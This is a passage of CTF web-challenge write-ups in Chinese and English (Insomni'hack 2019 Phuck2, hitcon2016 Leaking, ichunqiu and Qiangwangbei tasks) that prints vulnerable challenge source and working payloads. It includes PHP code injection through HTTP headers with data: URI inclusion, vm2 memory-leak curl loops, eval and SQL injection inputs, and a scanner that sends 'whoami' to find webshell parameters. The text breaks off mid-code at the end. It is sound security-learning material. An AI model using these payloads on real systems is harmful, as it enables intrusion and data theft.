<h2 id="Insomni’hack-2019-Phuck2"><a href="#Insomni’hack-2019-Phuck2" class="headerlink" title="Insomni’hack 2019 Phuck2"></a>Insomni’hack 2019 Phuck2</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    stream_wrapper_unregister(<span class="string">'php'</span>);<span class="comment">// 注释掉了php协议,不能用php://之类的玩意了</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'hl'</span>])) highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 这个函数将敏感字符给转义了,没法利用</span></span><br><span class="line">    $mkdir = <span class="function"><span class="keyword">function</span><span class="params">($dir)</span> </span>&#123;</span><br><span class="line">        system(<span class="string">'mkdir -- '</span>.escapeshellarg($dir));</span><br><span class="line">    &#125;;</span><br><span class="line">    $randFolder = bin2hex(random_bytes(<span class="number">16</span>));</span><br><span class="line">    $mkdir(<span class="string">'users/'</span>.$randFolder);</span><br><span class="line">    chdir(<span class="string">'users/'</span>.$randFolder);</span><br><span class="line">    <span class="comment">// 根据X-Forwarded-For 来创建新的文件目录</span></span><br><span class="line">    $userFolder = (<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>]) ? $_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>] : $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    $userFolder = basename(str_replace([<span class="string">'.'</span>,<span class="string">'-'</span>],[<span class="string">''</span>,<span class="string">''</span>],$userFolder));</span><br><span class="line">    </span><br><span class="line">    $mkdir($userFolder);</span><br><span class="line">    chdir($userFolder);</span><br><span class="line"><span class="comment">// 将server中所有内容都放进profile文件中,那么是否可以把php代码给放在$_SERVER中?</span></span><br><span class="line">    file_put_contents(<span class="string">'profile'</span>,print_r($_SERVER,<span class="keyword">true</span>));</span><br><span class="line"><span class="comment">//切回上一个目录</span></span><br><span class="line">    chdir(<span class="string">'..'</span>);</span><br><span class="line"><span class="comment">// 获取page变量的内容并替换点号</span></span><br><span class="line">    $_GET[<span class="string">'page'</span>]=str_replace(<span class="string">'.'</span>,<span class="string">''</span>,$_GET[<span class="string">'page'</span>]);</span><br><span class="line"><span class="comment">// page所指向文件的内容中不能有<span class="meta">&lt;?</span>和php字符</span></span><br><span class="line">    <span class="keyword">if</span>(!stripos(file_get_contents($_GET[<span class="string">'page'</span>]),<span class="string">'&lt;?'</span>) &amp;&amp; !stripos(file_get_contents($_GET[<span class="string">'page'</span>]),<span class="string">'php'</span>)) &#123;</span><br><span class="line">        <span class="comment">// 满足条件就包含page</span></span><br><span class="line">        <span class="keyword">include</span>($_GET[<span class="string">'page'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 回到主目录并删除之前创建的文件</span></span><br><span class="line">    chdir(<span class="keyword">__DIR__</span>);</span><br><span class="line">    system(<span class="string">'rm -rf users/'</span>.$randFolder);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET /index.php?page=data:,123456/profile HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:9767</span><br><span class="line">XXX: &lt;?php system(&apos;ls data:,123456&apos;);?&gt;</span><br><span class="line">X-Forwarded-For: data:,123456</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 0</span><br><span class="line">Cookie: csrftoken=eIQq1N7Rt009rYp1nhaMba1lvw9TZSNcJ6BoSp5KnIjOMSj4kQQ8nu8xQbrGr3IZ; sessionid=rreroe8p3tjqcelwzw1mfhe8dlbhmh8h</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">DNT: 1</span><br></pre></td></tr></table></figure>

<p>关键在于<code>page=data:,123456/profile</code> 这里,对于<code>file_get_content</code>函数,可以利用data协议格式如下:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">data:[&lt;media type&gt;][;base64],&lt;data&gt;</span><br></pre></td></tr></table></figure>

<p>前面两个都是可选项,平时网页里头有的直接用base64方式传入图片的就是这种协议.</p>
<p><code>file_get_content(&#39;data:,123456/profile&#39;)</code> 返回值就是<code>123456/profile</code> 就可以绕过条件判断的限制了.</p>
<p>接下来是include…看别人wp说<code>allow_url_include=Off</code> 不知道怎么看出来的,但是又说<code>data:,&lt;目录&gt;</code>这种格式又可以绕过并成功包含,不知道是为什么.</p>
<p>总之到这里是包含了<code>data:,123456/profile</code>这个文件了.接下来执行代码就可以了.</p>
<p><img src="https://user-images.githubusercontent.com/40637063/61700767-a6a02900-ad6f-11e9-9f29-2aa502fabb62.png" alt="image"></p>
<h2 id="hitcon2016-Leaking"><a href="#hitcon2016-Leaking" class="headerlink" title="hitcon2016 Leaking"></a>hitcon2016 Leaking</h2><p>nodejs代码审计</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="meta">"use strict"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> randomstring = <span class="built_in">require</span>(<span class="string">"randomstring"</span>);</span><br><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">"express"</span>);</span><br><span class="line"><span class="keyword">var</span> &#123;</span><br><span class="line">    VM</span><br><span class="line">&#125; = <span class="built_in">require</span>(<span class="string">"vm2"</span>);</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">"fs"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line"><span class="keyword">var</span> flag = <span class="built_in">require</span>(<span class="string">"./config.js"</span>).flag</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">"/"</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    res.header(<span class="string">"Content-Type"</span>, <span class="string">"text/plain"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*    Orange is so kind so he put the flag here. But if you can guess correctly :P    */</span></span><br><span class="line">    <span class="built_in">eval</span>(<span class="string">"var flag_"</span> + randomstring.generate(<span class="number">64</span>) + <span class="string">" = \"flag&#123;"</span> + flag + <span class="string">"&#125;\";"</span>)</span><br><span class="line">    <span class="keyword">if</span> (req.query.data &amp;&amp; req.query.data.length &lt;= <span class="number">12</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> vm = <span class="keyword">new</span> VM(&#123;</span><br><span class="line">            timeout: <span class="number">1000</span></span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="built_in">console</span>.log(req.query.data);</span><br><span class="line">        res.send(<span class="string">"eval -&gt;"</span> + vm.run(req.query.data));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.send(fs.readFileSync(__filename).toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">3000</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"listening on port 3000!"</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>可以看到,flag被赋值给一个随机变量,随后检测我们传入的参数,如果参数的长度小于12就先创建一个虚拟机然后在虚拟机中执行,执行时间不得超过一秒,并且将结果回显到客户端,否则依然显示当前执行文件的内容(也就是当前文件).</p>
<p>正常来说,虚拟机是不能访问虚拟机外的文件和变量的,但是可以如果是内存呢?</p>
<p><a href="https://github.com/ChALkeR/notes/blob/master/Buffer-knows-everything.md" target="_blank" rel="noopener">https://github.com/ChALkeR/notes/blob/master/Buffer-knows-everything.md</a></p>
<p>照着他的demo来实验一下:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> token = <span class="string">'password'</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> step=<span class="number">0</span>; step&lt;<span class="number">100000</span>; step++)&#123;</span><br><span class="line">    <span class="keyword">var</span> buf = (<span class="keyword">new</span> Buffer(<span class="number">200</span>)).toString(<span class="string">'ascii'</span>);</span><br><span class="line">    <span class="keyword">if</span>(buf.indexOf(token) !== <span class="number">-1</span>)&#123;</span><br><span class="line">	<span class="built_in">console</span>.log(<span class="string">'found at step'</span> + step +<span class="string">':'</span> +buf);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>测试结果:</p>
<p><img src="https://user-images.githubusercontent.com/40637063/61681294-8d7f8400-ad3f-11e9-9025-c5381c2d101f.png" alt="image"></p>
<p>注意这个漏洞只在5.4.1这种较低版本中会出现,因此执行的时候也要使用nvm来控制版本执行.</p>
<p>回到题目,看orange 的wp的payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">while true; do curl &apos;http://1.2.3.4/?data=Buffer(1e4)&apos; | grep -a flag; done;</span><br></pre></td></tr></table></figure>

<p>执行(直接复制到命令行会自动转义,要把转义符号去掉)</p>
<p><img src="https://user-images.githubusercontent.com/40637063/61681531-58bffc80-ad40-11e9-9d6d-cb8a7cfb2885.png" alt="image"></p>
<p>看到另外一篇wp<a href="https://lorexxar.cn/2016/10/10/hitcon2016/#leaking,发现数组是可以绕过长度限制的,但是他的payload" target="_blank" rel="noopener">https://lorexxar.cn/2016/10/10/hitcon2016/#leaking,发现数组是可以绕过长度限制的,但是他的payload</a>:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://52.198.115.130:3000/?data[]=for (var step = 0; step &lt; 100000; step++) &#123;var buf = (new Buffer(100)).toString(&apos;ascii&apos;);if (buf.indexOf(&quot;hitcon&#123;&quot;) !== -1) &#123;break;&#125;&#125;buf;</span><br></pre></td></tr></table></figure>

<p>会超时,大概是因为不在现场吧.</p>
<h2 id="buuoj-unicorn-shop"><a href="#buuoj-unicorn-shop" class="headerlink" title="buuoj unicorn shop"></a>buuoj unicorn shop</h2><p><img src="https://user-images.githubusercontent.com/40637063/61510616-34a1aa00-aa26-11e9-91d3-e63e73d2cb62.png" alt="image"></p>
<p>这里只有两个地方可以输入,我们要买的东西就是第四个玩意,但是随便输入一些东西就会发现,价格那一栏只能填一个字符.查看源码看看.</p>
<p><img src="https://user-images.githubusercontent.com/40637063/61510696-95c97d80-aa26-11e9-8abb-dbdaf20048b2.png" alt="image"></p>
<p>他说这个utf-8编码很重要……emmm…..查了一下发现有原题.可以传入一个<code>ↈ</code> 符号,这个是某个国家的计量符号,代表十万,不过也可以传入<code>亿</code> 这样中文的字符来表示我们的价格.这样就能得到flag了.</p>
<h2 id="ichunqiu-爆破-2"><a href="#ichunqiu-爆破-2" class="headerlink" title="ichunqiu 爆破-2"></a>ichunqiu 爆破-2</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line">$a = @$_REQUEST[<span class="string">'hello'</span>];</span><br><span class="line"><span class="keyword">eval</span>( <span class="string">"var_dump($a);"</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<p><code>hello=$GLOBALS</code> works , but flag is not a variable in this case . </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hello=file_get_contents(&apos;flag.php&apos;)</span><br></pre></td></tr></table></figure>

<p>it work! <code>file_get_contents</code> function will return a variable whose type is <code>string</code>.</p>
<h2 id="ichunqiu-爆破-1"><a href="#ichunqiu-爆破-1" class="headerlink" title="ichunqiu 爆破-1"></a>ichunqiu 爆破-1</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">string(<span class="number">38</span>) <span class="string">"flag在一个长度为6的变量里面"</span> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line">$a = @$_REQUEST[<span class="string">'hello'</span>];</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">'/^\w*$/'</span>,$a ))&#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">'ERROR'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">"var_dump($$a);"</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>This puzzle was so easy to mislead us to write a script and trying to enumerate all possibilities… But actually , when observing the <code>var_dump($$a);</code> we can surely use <code>$GLOBAL</code> to print all variables.</p>
<p>SO, just let <code>hello=GLOBALS</code> and we can get flag.</p>
<p><img src="https://user-images.githubusercontent.com/40637063/59854352-59fab400-93a5-11e9-8086-653e956e7013.png" alt="image"></p>
<blockquote>
<p>ps: Global variables in php</p>
<p>$GLOBALS</p>
<p>$_SERVER</p>
<p>$_REQUEST</p>
<p>$_POST</p>
<p>$_GET</p>
<p>$_FILES</p>
<p>$_ENV</p>
<p>$_COOKIE</p>
<p>$_SESSION</p>
</blockquote>
<h2 id="ichunqiu-象棋"><a href="#ichunqiu-象棋" class="headerlink" title="ichunqiu 象棋"></a>ichunqiu 象棋</h2><p>Find flag by brute-force, finding two scripts from others to learn.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> queue</span><br><span class="line"><span class="keyword">from</span> queue <span class="keyword">import</span> Queue</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">text</span><span class="params">()</span>:</span></span><br><span class="line">    url = <span class="string">'http://c8f52486449f4f9fadd09977d3349ea281ba15d9079e48b8.changame.ichunqiu.com/js/'</span></span><br><span class="line">    strs = <span class="string">'abcmlyx'</span></span><br><span class="line">    num = <span class="string">'0123456789'</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> strs:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> strs:</span><br><span class="line">            <span class="keyword">for</span> h <span class="keyword">in</span> num:</span><br><span class="line">                <span class="keyword">for</span> l <span class="keyword">in</span> num:</span><br><span class="line">                    <span class="keyword">for</span> n <span class="keyword">in</span> num:</span><br><span class="line">                       new_url = url+i+j+<span class="string">'ctf'</span>+h+l+n+<span class="string">'.js'</span></span><br><span class="line">                       q.put(new_url)</span><br><span class="line">                       </span><br><span class="line">                       </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">requ</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> q.empty():</span><br><span class="line">        u = q.get(<span class="literal">True</span>, <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.get(u).text</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'404'</span> <span class="keyword">not</span> <span class="keyword">in</span> r:</span><br><span class="line">                print(r)</span><br><span class="line">            q.task_done()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            q.put(u)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>:</span><br><span class="line">    q = Queue()</span><br><span class="line">    text()</span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> range(<span class="number">300</span>):</span><br><span class="line">        t = threading.Thread(target=requ)</span><br><span class="line">        t.daemon = <span class="literal">True</span></span><br><span class="line">        t.start()</span><br><span class="line">        </span><br><span class="line">    q.join()</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="comment"># Author=haya</span></span><br><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"><span class="keyword">from</span> multiprocessing.dummy <span class="keyword">import</span> Pool <span class="keyword">as</span> ThreadPool</span><br><span class="line">urllist = []</span><br><span class="line">re1 = <span class="string">'myx'</span></span><br><span class="line">re2 = <span class="string">'012346789'</span></span><br><span class="line">url = <span class="string">'http://d0fdd193e2fa40ab9287e6c40341ef4fc310ea9b723f4b84.game.ichunqiu.com/js/'</span></span><br><span class="line">pool = ThreadPool()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">url_list</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> re1:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> re1:</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> re2:</span><br><span class="line">                <span class="keyword">for</span> l <span class="keyword">in</span> re2:</span><br><span class="line">                    <span class="keyword">for</span> m <span class="keyword">in</span> re2:</span><br><span class="line">               			urllist.append(url+i+j+<span class="string">'ctf'</span>+k+l+m+<span class="string">'.js'</span>)</span><br><span class="line">    <span class="keyword">return</span> urllist</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">url_open</span><span class="params">(url)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            result = urllib2.urlopen(url).read()</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'404'</span> <span class="keyword">not</span> <span class="keyword">in</span> result:</span><br><span class="line">                <span class="keyword">print</span> url+result</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    urllist = url_list()</span><br><span class="line">    pool.map(url_open, urllist)</span><br><span class="line">    pool.close()</span><br><span class="line">    pool.join()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<h2 id="ichunqiu-时间"><a href="#ichunqiu-时间" class="headerlink" title="ichunqiu 时间"></a>ichunqiu 时间</h2><p>Source Code:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">header(<span class="string">"content-type:text/html;charset=utf-8"</span>);</span><br><span class="line"><span class="string">'天下武功唯快不破'</span>;</span><br><span class="line">setcookie(<span class="string">'token'</span>,<span class="string">'hello'</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> ($_COOKIE[<span class="string">'token'</span>]==<span class="string">'hello'</span>)&#123;</span><br><span class="line">  $txt = file_get_contents(<span class="string">'flag.php'</span>);</span><br><span class="line">  $filename = <span class="string">'u/'</span>.md5(mt_rand(<span class="number">1</span>,<span class="number">1000</span>)).<span class="string">'.txt'</span>;</span><br><span class="line">  file_put_contents($filename,$txt);</span><br><span class="line">  sleep(<span class="number">10</span>);</span><br><span class="line">  unlink($filename);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>The script to generate filename:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5_write</span><span class="params">(begin,end,filename)</span>:</span></span><br><span class="line">    mutex.acquire()</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"begin count md5 value from %s to %s"</span> %(str(begin),str(end))</span><br><span class="line">    mutex.release()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(begin,end):</span><br><span class="line">        tmp = hashlib.md5(str(i))</span><br><span class="line">        mutex.acquire()</span><br><span class="line">        filename.write(<span class="string">'u/'</span>+str(tmp.hexdigest())+<span class="string">'.txt'</span>+<span class="string">'\n'</span>)</span><br><span class="line">        mutex.release()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    mutex = threading.Lock()</span><br><span class="line">    threads = []</span><br><span class="line">    f = open(<span class="string">'dict.txt'</span>,<span class="string">'w+'</span>)</span><br><span class="line">    t1 = threading.Thread(target=md5_write, args=(<span class="number">1</span>,<span class="number">250</span>,f))</span><br><span class="line">    t2 = threading.Thread(target=md5_write, args=(<span class="number">250</span>,<span class="number">500</span>,f))</span><br><span class="line">    t3 = threading.Thread(target=md5_write, args=(<span class="number">500</span>,<span class="number">750</span>,f))</span><br><span class="line">    t4 = threading.Thread(target=md5_write, args=(<span class="number">750</span>,<span class="number">1000</span>,f))</span><br><span class="line">    threads.append(t1)</span><br><span class="line">    threads.append(t2)</span><br><span class="line">    threads.append(t3)</span><br><span class="line">    threads.append(t4)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">        t.setDaemon(<span class="literal">True</span>)</span><br><span class="line">        t.start()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">        t.join()</span><br></pre></td></tr></table></figure>

<p>The script to get flag:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://c726f71499614c9caa416ae33040d067dee7bc7a06e34089.changame.ichunqiu.com/"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag</span><span class="params">(line)</span>:</span></span><br><span class="line">    res = requests.get(url+line)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'flag'</span> <span class="keyword">in</span> res.content:</span><br><span class="line">        mutex.acquire()</span><br><span class="line">        <span class="keyword">print</span> res.content</span><br><span class="line">        mutex.release()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    f = open(<span class="string">'dict.txt'</span>)</span><br><span class="line">    lines = f.readlines()</span><br><span class="line">    mutex = threading.Lock()</span><br><span class="line">    threads = []</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">        <span class="comment"># important to add a ',' , which indicate the number of parameters</span></span><br><span class="line">        s = threading.Thread(target = get_flag, args = (line, ))</span><br><span class="line">        threads.append(s)</span><br><span class="line"></span><br><span class="line">    data = &#123;</span><br><span class="line">            <span class="string">'token'</span>:<span class="string">'hello'</span></span><br><span class="line">            &#125;</span><br><span class="line">    res = requests.get(url,cookies=data)</span><br><span class="line">    <span class="keyword">print</span> res.content</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">        t.setDaemon(<span class="literal">True</span>)</span><br><span class="line">        t.start()</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">if</span> threading.active_count() &lt; <span class="number">3</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">        t.join()</span><br></pre></td></tr></table></figure>

<h2 id="2019-强网杯-高明的黑客"><a href="#2019-强网杯-高明的黑客" class="headerlink" title="2019 强网杯 高明的黑客"></a>2019 强网杯 高明的黑客</h2><p>下载源码有30mb，超过三千个文件，每个文件内部都是类似于这样的内容</p>
<p><img src="https://user-images.githubusercontent.com/40637063/58483762-6e2b0700-8193-11e9-9d00-fb36d55a8adf.png" alt="image"></p>
<p>完全没有办法阅读，而且不少代码是无效代码。</p>
<p>但是很多文件内部都有get和post，甚至可以看见eval的影子。</p>
<p>所以猜测可能某个文件内的某个参数是有效而且是可以执行的。</p>
<p>扫描脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Detect</span><span class="params">(file)</span>:</span></span><br><span class="line">    mutex.acquire()</span><br><span class="line">    <span class="keyword">print</span> file</span><br><span class="line">    mutex.release()</span><br><span class="line">    f = open(file, <span class="string">'r'</span>)</span><br><span class="line">    flines = f.readlines()</span><br><span class="line"></span><br><span class="line">    content = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> flines:</span><br><span class="line">        content += line</span><br><span class="line"></span><br><span class="line">    get_result = re.findall(<span class="string">r"\$_GET\['(.*?)'\]"</span>, content)</span><br><span class="line">    post_result = re.findall(<span class="string">r"\$_POST\['(.*?)'\]"</span>, content)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> get_result:</span><br><span class="line">        res = session.get(url + str(file) +<span class="string">"?"</span> + i + <span class="string">"="</span> + <span class="string">"whoami"</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'www-data'</span> <span class="keyword">in</span> res.content:</span><br><span class="line">            mutex.acquire()</span><br><span class="line">            <span class="keyword">print</span> str(file) + <span class="string">"is vulunable with parameter %s"</span> % i </span><br><span class="line">            finaltarget.append(str(file))</span><br><span class="line">            finaltarget.append(i)</span><br><span class="line">            mutex.release()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> post_result:</span><br><span class="line">        data = &#123;i:<span class="string">"whoami"</span>&#125;</span><br><span class="line">        res = session.post(url + str(file), data = data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"www-data"</span> <span class="keyword">in</span> res.content:</span><br><span class="line">            mutex.acquire()</span><br><span class="line">            <span class="keyword">print</span> str(file) + <span class="string">"is vulunable with post parameter %s"</span> % i</span><br><span class="line">            finaltarget.append(str(file))</span><br><span class="line">            finaltarget.append(i)</span><br><span class="line">            mutex.release()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"></span><br><span class="line">    finaltarget = []</span><br><span class="line">    url = <span class="string">"http://127.0.0.1/"</span></span><br><span class="line">    ct = time.time()</span><br><span class="line">    session = requests.session()</span><br><span class="line">    mutex = threading.Lock()</span><br><span class="line">    path = <span class="string">'src/'</span></span><br><span class="line">    files = os.listdir(path)</span><br><span class="line">    threads = []</span><br><span class="line">    <span class="keyword">for</span> file <span class="keyword">in</span> files:</span><br><span class="line">        t = threading.Thread(target = Detect, args = (path + file,))</span><br><span class="line">        threads.append(t)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">        t.setDaemon(<span class="literal">True</span>)</span><br><span class="line">        t.start()</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">if</span> threading.active_count() &lt; <span class="number">30</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">        t.join()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> finaltarget</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Time used:"</span></span><br><span class="line">    <span class="keyword">print</span> time.time() - ct</span><br></pre></td></tr></table></figure>

<p><img src="https://user-images.githubusercontent.com/40637063/58484538-d6c6b380-8194-11e9-8abd-872dfbe583b5.png" alt="image"></p>
<h2 id="ichunqiu-Look"><a href="#ichunqiu-Look" class="headerlink" title="ichunqiu Look"></a>ichunqiu Look</h2><p>refresh the page with burpsuite , and here comes the hint:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">X-HT: verify</span><br></pre></td></tr></table></figure>

<p>and payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">index.php?verify=&apos;=0%23</span><br></pre></td></tr></table></figure>

<p>it is the shortest password.</p>
<p>…</p>
<p>…</p>
<p>Got the source code:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$con = mysql_connect(<span class="string">'localhost'</span>,<span class="string">'root'</span>,<span class="string">''</span>);</span><br><span class="line">mysql_query(<span class="string">"set names utf8"</span>);</span><br><span class="line">mysql_select_db(<span class="string">"ctf"</span>);</span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">"REMOTE_ADDR"</span>]==<span class="string">'8.8.8.8'</span>)&#123;</span><br><span class="line">    $name = addslashes($_GET[<span class="string">'usern3me'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(stripos($_GET[<span class="string">'usern3me'</span>],<span class="string">'Bctf2O16'</span>)!==<span class="keyword">false</span>)&#123;</span><br><span class="line">        $name = <span class="string">'FUCK'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        $name = addslashes($_GET[<span class="string">'usern3me'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'hello '</span>.$name;</span><br><span class="line">$sql = <span class="string">"select * from admin where name='$name'"</span>;</span><br><span class="line">$result = mysql_query($sql);</span><br><span class="line">$num = mysql_num_rows($result);</span><br><span 